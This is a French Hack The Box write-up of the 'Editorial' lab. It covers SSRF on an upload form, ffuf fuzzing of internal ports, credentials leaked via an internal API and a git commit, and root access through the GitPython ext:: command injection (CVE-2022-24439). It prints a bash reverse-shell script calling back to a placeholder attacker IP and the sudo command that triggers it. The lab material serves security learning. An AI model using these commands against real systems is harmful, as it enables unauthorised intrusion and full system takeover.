---
date: 2024-10-16T21:00:55-05:00
# description: ""
image: "/images/HTB-Editorial/Editorial.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Editorial"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Editorial](https://app.hackthebox.com/machines/Editorial)
* Niveau: Facile
* OS: Linux
---

Editorial est une machine Linux assez simple, mais qui présente quelques particularités. L'application web est vulnérable au Server-Side Request Forgery (SSRF), mais elle nécessite un fuzzing des ports internes pour découvrir des données sensibles. En exploitant un point de terminaison API, nous récupérons des identifiants qui nous donnent un accès initial au système. Au cours d'une énumération plus poussée, nous découvrons une série de commits Git, dont l'un expose les informations d'identification d'un autre utilisateur, ce qui permet un déplacement latéral. L'escalade des privilèges est réalisée en exploitant le CVE-2022-24439 en combinaison avec un script exécutable en tant que root.

Addresse IP cible - `10.10.11.20`

## Balayage

```
./nmap_scan.sh 10.10.11.20 Editorial
```

**Résultats**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 21:07 CDT
Nmap scan report for 10.10.11.20
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds
```

Nmap trouve deux ports ouverts, 22 (SSH) et 80 (HTTP), de plus il y a une redirection vers `editorial.htb`.

```
sudo echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts
```

## Enumération

Sur `http://editorial.htb`, nous trouvons le site web d'une maison d'édition.

![Editorial website](/images/HTB-Editorial/Editorial_website.png)

En cliquant sur `Publish with Us`, nous accédons à `http://editorial.htb/upload`, où nous pouvons soit envoyer un lien, soit télécharger un fichier.

![Editorial Publish with Us page](/images/HTB-Editorial/editorial_upload_feature.png)

Puisque l'application accepte une url fournie par l'utilisateur, testons le SSRF. Une fois le formulaire rempli, nous capturons la requête obtenue après avoir cliqué sur le bouton `Preview`.

![Editorial upload-cover request](/images/HTB-Editorial/Upload_Cover_Req.png)

Nous envoyons la requête et obtenons une réponse valide (**Status Code 200OK**), le header du serveur (**nginx/1.18.0 (Ubuntu)**), et un contenu à `/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg` provenant très probablement d'une application interne. Cela signifie que le SSRF fonctionne, car l'application récupère et renvoie le contenu du service interne à `127.0.0.1:80`.

![Editorial upload-cover request response](/images/HTB-Editorial/Upload_Cover_response.png)

Un autre test consisterait à utiliser notre propre adresse IP avec un numéro de port de notre choix, nous aurons également un listener qui écoutera sur ce même port.

![SSRF test on local Kali](/images/HTB-Editorial/SSRF_test.png)

Sur le listener, nous recevons une réponse qui confirme également la présence du SSRF.

![SSRF local test nc response](/images/HTB-Editorial/SSRF_nc_connection.png)

En examinant le contenu de la réponse avec `http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg`, nous observons une image banale.

![Editorial SSRF response content](/images/HTB-Editorial/response_content.png)

Nous sommes sur la bonne voie, mais il nous manque un élément. La plupart du temps, les applications internes fonctionnent sur un port différent qui n'est pas exposé au public. Afin de trouver le bon port, nous effectuerons un peu de fuzzing.

J'utilise la requête que nous avons interceptée avec Burp plus tôt, je la formate autant que possible et je supprime les headers redondants.

En l'utilisant avec ffuf, nous trouvons le port `5000`.

> Cette opération peut être répliquée avec la fonction Intruder de Burp, mais gardez à l'esprit que la version gratuite limite cette fonction, donc fuzzer tous les ports vous prendrait beaucoup de temps! Ffuf le fait en moins de 4 minutes, ce qui nous fait gagner beaucoup de temps.

```
ffuf -u 'http://editorial.htb/upload-cover' \
-d $'-----------------------------29074654981783001802154691355\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\nhttp://127.0.0.1:FUZZ/\r\n-----------------------------29074654981783001802154691355\r\nContent-Disposition: form-data; name="bookfile"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------29074654981783001802154691355--' \
-w <(seq 1 65535) \
-H 'Content-Type: multipart/form-data; boundary=---------------------------29074654981783001802154691355' \
-H 'Host: editorial.htb' \
-t 100 \
-mc all \
-fs 61
```

![SSRF ffuf internal port fuzzing](/images/HTB-Editorial/SSRF_ffuf_Fuzzing.png)


| Option | Description                                                                                 |
| ------ | ------------------------------------------------------------------------------------------- |
| -u     | Spécifie l'URL cible                                                                   |
| -d $   | Spécifie le corps de la requête HTTP                                                            |
| -w     | Wordlist (nous utilisons une liste générée de manière dynamique pour tous les numéros de port)               |
| FUZZ   | Ce texte sera remplacé par chaque nombre au cours du processus de fuzzing                    |
| -H     | Spécifie l'en-tête HTTP                                                                      |
| -t 100 | Définit le nombre de threads simultanés                                                      |
| -mc    | Spécifie le code d'état de la réponse HTTP à filtrer                                         |
| all    | Si elle est utilisée, ffuf ne filtrera pas les réponses sur la base des codes d'état et affichera toutes les réponses |
| -fs 61 | Filtre en fonction de la taille de la réponse. Ici, les réponses dont la taille du corps est de 61 octets seront filtrées |

![SSRF Internal port 5000 found](/images/HTB-Editorial/internal_port_5000_found.png)

## Accès initial

Maintenant, nous renvoyons la requête avec `http://127.0.0.1:5000` et obtenons un répertoire différent (`uploads`).

![SSRF Internal port number request](/images/HTB-Editorial/SSRF_internal_port_number.png)

Lorsque nous allons sur `http://editorial.htb/static/uploads/e9ed8f81-925d-40e0-945e-7fcb30899573`, un fichier est automatiquement téléchargé sur notre machine.

![SSRF File Downloaded](/images/HTB-Editorial/File_Downloaded.png)

Il contient des données JSON.

![JSON Data ugly](/images/HTB-Editorial/JSON_data_ugly.png)

Avec `jq` nous pouvons le rendre plus lisible.

```
cat e9ed8f81-925d-40e0-945e-7fcb30899573 | jq
```

![JSON Data pretty](/images/HTB-Editorial/JSON_data_pretty.png)

Il s'agit d'une liste de points d'accès à l'API.

```JSON
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Après les avoir testés, la réponse que nous obtenons avec `http://127.0.0.1:5000/api/latest/metadata/messages/authors` déclenche un autre téléchargement de fichier à `http://editorial.htb/static/uploads/c1c51caa-8a20-4f95-aca1-3a55e0a0fb69`.

![message authors api endpoint](/images/HTB-Editorial/message_authors_api_endpoint.png)

![message authors api endpoint file downloaded](/images/HTB-Editorial/message_authors_file.png)

Il s'agit d'un message de bienvenue pour un auteur avec ses identifiants, `dev:dev080217_devAPI!@`.

![dev credentials](/images/HTB-Editorial/dev_credentials.png)

En utilisant ces identifiants, nous nous connectons via SSH et récupérons le drapeau utilisateur.

![dev shell and user flag](/images/HTB-Editorial/user_flag_editorial.png)

### Mouvement latéral (Shell en tant que prod)

Dans `/home/dev/apps` nous trouvons un répertoire `.git`.

![.git file](/images/HTB-Editorial/git-file.png)

L'exécution de `git log` à l'intérieur de ce dernier permet d'obtenir une liste de commits.

![git log command](/images/HTB-Editorial/git_log.png)

Après avoir utilisé `git show` sur le troisième commit en partant du haut, nous trouvons d'autres informations d'identification, `prod:080217_Producti0n_2023!@`.

```
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

![prod user credentials](/images/HTB-Editorial/prod_creds.png)

Avec ces derniers, nous obtenons un autre shell SSH sous le nom de `prod`, le répertoire personnel de cet utilisateur ne contient rien de spécial.

Cependant, il est autorisé à exécuter la commande `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py` avec n'importe quel argument (`*`) en tant qu'utilisateur root.

![sudo -l command](/images/HTB-Editorial/sudo-l_cmd.png)

Examinons le contenu de `/opt/internal_apps/clone_changes/clone_prod_change.py`.

![clone_prod_change python script](/images/HTB-Editorial/clone_prod_change_script.png)

Ce script clone un répertoire Git dans un répertoire spécifique (`/opt/internal_apps/clone_changes`). L'option `multi_options=["-c protocol.ext.allow=always"]` permet au protocole `ext::` d'être utilisé pour le clonage.

## Elévation de Privilèges

En utilisant `pip3 list` nous trouvons la liste de tous les paquets Python installés sur le système. `GitPython` se démarque immédiatement, il utilise la version `3.1.29`.

![installed python packages list](/images/HTB-Editorial/python_pkg_list.png)

Des recherches sur les vulnérabilités de cette version nous permettent de trouver le [CVE-2022-24439](https://github.com/PyCQA/bandit/issues/971) avec un PoC [ici](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).

Le code exploite le protocole `ext::` de Git qui permet aux utilisateurs de passer des commandes externes au lieu des protocoles standards tels que `https` et `ssh`, ce qui permet de réaliser une injection de commande.

Utilisons un script bash afin d'obtenir un shell inversé en tant que `root`.

Nous créons `revshell.sh` et le rendons exécutable avec `chmod +x revshell.sh`.

```bash
#!/bin/bash

IP="YOUR_IP"  
PORT="PORT_NUMBER"

/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1
```

Ensuite, nous exécutons la commande ci-dessous pour obtenir un shell root sur notre listener, ce qui nous permet de lire le drapeau root dans `/root`.

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::/tmp/revshell.sh'
```

![Reverse shell trigger](/images/HTB-Editorial/git_script_ext.png)

![Editorial root flag](/images/HTB-Editorial/root_flag_editorial.png)

Ce défi était assez simple, du moment que vous étiez minutieux dans votre énumération. Merci d'avoir pris le temps de lire cet article et portez vous bien!
